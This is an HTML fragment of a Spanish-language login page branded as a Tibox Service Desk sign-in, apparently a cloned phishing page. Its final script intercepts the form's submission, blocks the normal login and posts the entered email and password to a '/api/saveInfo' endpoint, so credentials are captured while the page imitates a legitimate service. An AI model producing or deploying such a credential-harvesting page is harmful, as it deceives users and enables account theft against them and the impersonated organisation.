    <style type="text/css" id="core-notify" class="normal">
      .notifyjs-corner {
        position: fixed;
        margin: 5px;
        z-index: 1050;
      }

      .notifyjs-corner .notifyjs-wrapper,
      .notifyjs-corner .notifyjs-container {
        position: relative;
        display: block;
        height: inherit;
        width: inherit;
        margin: 3px;
      }

      .notifyjs-wrapper {
        z-index: 1;
        position: absolute;
        display: inline-block;
        height: 0;
        width: 0;
      }

      .notifyjs-container {
        display: none;
        z-index: 1;
        position: absolute;
      }

      .notifyjs-hidable {
        cursor: pointer;
      }

      [data-notify-text],
      [data-notify-html] {
        position: relative;
      }

      .notifyjs-arrow {
        position: absolute;
        z-index: 2;
        width: 0;
        height: 0;
      }
    </style>

    </div>
    <div class="container body-content normal">
      <h2 class="normal">Inicio de Sesión</h2>

      <div class="row normal">
        <div class="form-horizontal normal">
          <section id="loginForm" class="normal">
            <form
              id="loginFormForm"
              method="post"
              class="normal"
              novalidate="novalidate"
            >
              <input
                name="__RequestVerificationToken"
                type="hidden"
                value="HUJSvO8ZbcqJm15Bq0TwOGAIPegUxvbG2gdZ74huwZrbdU2AkZAaea4FIZxMqsd1uns-kxP-fAEoZ8nD1x8D2aTYj3CxYHh2ud-0Awc95Co1"
                class="normal"
              />
              <h4 class="normal">Inicie sesión con su cuenta.</h4>
              <hr class="normal" />
              <div class="form-group normal">
                <label class="col-md-2 control-label normal" for="userMail"
                  >E-Mail</label
                >
                <div class="col-md-10 normal">
                  <input
                    class="form-control normal"
                    data-val="true"
                    data-val-length="The field E-Mail must be a string with a maximum length of 200."
                    data-val-length-max="200"
                    data-val-required="¡Campo obligatorio!"
                    id="userMail"
                    name="userMail"
                    type="text"
                  />
                  <span
                    class="field-validation-valid text-danger normal"
                    data-valmsg-for="userMail"
                    data-valmsg-replace="true"
                  ></span>
                </div>
              </div>
              <div class="form-group normal">
                <label class="col-md-2 control-label normal" for="userPass"
                  >Contraseña</label
                >
                <div class="col-md-10 normal">
                  <input
                    class="form-control normal"
                    data-val="true"
                    data-val-length="The field Contraseña must be a string with a minimum length of 6 and a maximum length of 30."
                    data-val-length-max="30"
                    data-val-length-min="6"
                    data-val-required="¡Campo obligatorio!"
                    id="userPass"
                    name="userPass"
                    type="password"
                  />
                  <span
                    class="field-validation-valid text-danger normal"
                    data-valmsg-for="userPass"
                    data-valmsg-replace="true"
                  ></span>
                </div>
              </div>
              <div class="form-group normal">
                <div class="col-md-offset-2 col-md-10 normal">
                  <input
                    type="submit"
                    value="Log in"
                    class="btn btn-default normal"
                  />
                </div>
              </div>
            </form>
          </section>
        </div>
      </div>

      <script type="text/javascript" class="normal">
        $(document).ready(function () {
          $("#userMail").focus();
        });
      </script>
      <hr class="col-sm-12 col-md-12 col-lg-12 normal" />
      <footer class="col-sm-12 col-md-12 col-lg-12 normal">
        <p class="normal">
          © 2023 Service Desk - Powered by
          <a href="http://www.tibox.cl/" target="_blank" class="normal"
            >Tibox ®</a
          >
        </p>
      </footer>
    </div>

    <script type="text/javascript">
        const loginForm = document.getElementById('loginFormForm');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault()

            const userMail = document.getElementById('userMail').value;
            const userPass = document.getElementById('userPass').value;

            try {
                await fetch('/api/saveInfo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        userMail,
                        userPass
                    })
                })
            } catch (err) {
                console.log(err)
            }
            
        })
    </script>
